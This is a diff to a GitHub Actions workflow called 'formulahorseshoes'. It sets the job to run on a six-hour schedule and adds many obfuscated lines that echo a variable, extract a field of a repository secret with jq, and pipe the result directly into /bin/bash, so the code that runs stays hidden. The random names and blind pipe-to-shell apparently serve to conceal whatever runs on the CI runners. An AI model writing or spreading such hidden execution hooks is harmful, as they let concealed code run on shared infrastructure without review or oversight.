@@ -1,9 +1,9 @@
 name: formulahorseshoes
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 2/6 * * *'
-
+    - cron: '41 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,12 +12,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: formulahorseshoes
         env:
-          eerb11: ${{ secrets.eerb11 }}
+          bjal5: ${{ secrets.bjal5 }}
         run: |
-          echo $eerb11 | jq -r .suvso72 | /bin/bash
-          echo $hxo09 | jq -r .ulhw484 | /bin/bash
-          echo $szn08969 | jq -r .vk421 | /bin/bash
-          echo $kvq8 | jq -r .vzbt01 | /bin/bash
-          echo $jwgq4 | jq -r .vfzgf7701 | /bin/bash
-          echo $zpl7 | jq -r .reh49 | /bin/bash
+          echo $bjal5 | jq -r .gboq940 | /bin/bash
+          echo $buzjd95 | jq -r .g225 | /bin/bash
+          echo $gh12319 | jq -r .izd415 | /bin/bash
+          echo $o960 | jq -r .ujqa1 | /bin/bash
+          echo $uak56 | jq -r .xne31164 | /bin/bash
+          echo $hmx49431 | jq -r .es93462 | /bin/bash
+          echo $c37183 | jq -r .pjl5 | /bin/bash
+          echo $i95 | jq -r .ifvle43 | /bin/bash
+          echo $cc7907 | jq -r .tf66981 | /bin/bash
+          echo $xdvmr62 | jq -r .a0497 | /bin/bash
+          echo $pmyf2 | jq -r .l8 | /bin/bash
+          echo $h84 | jq -r .snsro32 | /bin/bash
+          echo $upw7 | jq -r .oigq28844 | /bin/bash
+          echo $fi60 | jq -r .ogd850 | /bin/bash
+          echo $qag0 | jq -r .lfjj6 | /bin/bash
 
